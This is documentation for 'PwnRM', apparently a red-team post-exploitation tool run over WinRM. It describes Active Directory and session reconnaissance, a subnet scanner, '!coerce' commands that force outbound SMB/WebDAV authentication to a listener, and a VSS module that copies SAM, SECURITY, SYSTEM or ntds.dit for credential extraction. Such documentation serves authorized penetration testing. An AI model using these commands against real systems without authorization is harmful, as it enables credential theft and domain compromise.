# Collection, network reconnaissance, and playbooks

## Built-in reconnaissance resources

`!adtriage`, `!shares`, and `!sessions` load packaged PowerShell resources as
UTF-16LE/Base64 and run them in the current runspace. Each resource is parsed
against Windows PowerShell 5.1 during live validation and emits a completion
marker.

### AD triage

`!adtriage` summarizes domain identity, trusts, privileged groups, SPNs,
AS-REP candidates, delegation attributes, gMSA/dMSA indicators, and a quick
ADCS view. `--quick` restricts slower sections. The results are reconnaissance and
do not modify AD.

### Share scout

`!shares` inventories local shares and optional target hosts, probes UNC read
and write access, reviews broad ACL entries, checks SYSVOL/NETLOGON for selected
sensitive patterns, and identifies GPP `cPassword` material when visible.
`--quick` limits the work.

### Session scout

`!sessions` maps WMI logon sessions, RDP client history, cached-credential
indicators, Kerberos ticket listings, TCP listeners/connections, selected named
pipes, and SYSTEM scheduled tasks. Some commands require local administrator
rights and unavailable sections are reported rather than fabricated.

### System snapshot

`!sysinfo` reports OS/build/domain, recent hotfixes, SecurityCenter2 products
when that namespace exists, local Administrators, and SMB signing state.
SecurityCenter2 is commonly absent on servers and domain controllers; this is
handled without producing a failing nonterminating error.

## Bounded network scan (`!lateral`)

```text
!lateral --subnet 192.0.2.0/28
!lateral --subnet 192.0.2.0/28 --ports 5985,5986,445,135,3389
!lateral --subnet 192.0.2.0/28 --probe-auth
```

The subnet must be IPv4 and contain no more than 1024 usable addresses. Ports
are validated and deduplicated. The remote PowerShell host performs TCP probes;
`--probe-auth` additionally sends a small WS-Management request to reachable
WinRM endpoints and distinguishes open/auth-required responses.

This is a scout, not a lateral execution engine. It does not authenticate to
SMB/WMI/RDP, execute on discovered hosts, or create sessions automatically.

## Outbound UNC authentication probe (`!coerce`)

```text
!coerce webdav --listener 10.10.14.5
!coerce webdav --listener relay.lab --port 8080
!coerce smb --listener 10.10.14.5
!coerce all --listener 10.10.14.5
```

The listener is encoded before insertion into PowerShell. `webdav` accesses a
path of the form `\\listener@port\DavWWWRoot\...`; `smb` accesses
`\\listener\...`. Those are real outbound access attempts as the current remote
identity. They may trigger authentication depending on host policy and service
state.

PwnRM does not contain RPC clients for MS-RPRN, MS-EFSR, or MS-DFSNM. Old
method aliases are rejected rather than reporting a fake coercion attempt.

## VSS staging (`!vss`)

The module creates a `Win32_ShadowCopy` through WMI and selects SAM or NTDS
explicitly or from the host role. It copies `SYSTEM` plus SAM/SECURITY or
`ntds.dit` to a random remote temporary directory and reports SHA-256 values.
The shadow copy is deleted in `finally`, and a cleanup failure is surfaced.

The staged directory is not automatically downloaded or removed. The operator
must collect it with `!download` and remove it according to the engagement's
cleanup plan. This behavior is disk staging even though it avoids launching
`vssadmin.exe` or `ntdsutil.exe`.

## Playbooks (`!playbook`)

Built-ins are listed with `!playbook list` and executed with
`!playbook run NAME`. A custom JSON file uses `!playbook run --file PATH`.

Minimal schema:

```json
{
  "name": "example",
  "steps": [
    {
      "cmd": "!sysinfo",
      "capture_as": "snapshot",
      "on_fail": "abort",
      "cleanup_on_fail": ["!socks stop"]
    }
  ]
}
```

The loader validates the top-level shape, step fields, command strings,
conditions, failure mode, and cleanup lists. A returned module error or remote
PowerShell error fails the step. Cleanup runs before either aborting or
continuing. Conditions may reference previously captured values; they do not
evaluate arbitrary Python.

Playbooks are sequential. They do not make unsafe commands safe and do not
expand the authorization of the current session.

## Structured loot

`LootManager` stores credentials and binary artifacts below
`$PWNRM_DIR/loot`. Target/category/filename components are bounded to simple
names. Directories reject symlinks; JSON metadata is atomically replaced and
files are mode `0600` on POSIX. `MANIFEST.json` records a SHA-256 digest and
source metadata for each entry.

Loot encryption is not provided. Directory permissions protect local data only
against other unprivileged accounts on the same correctly configured host.
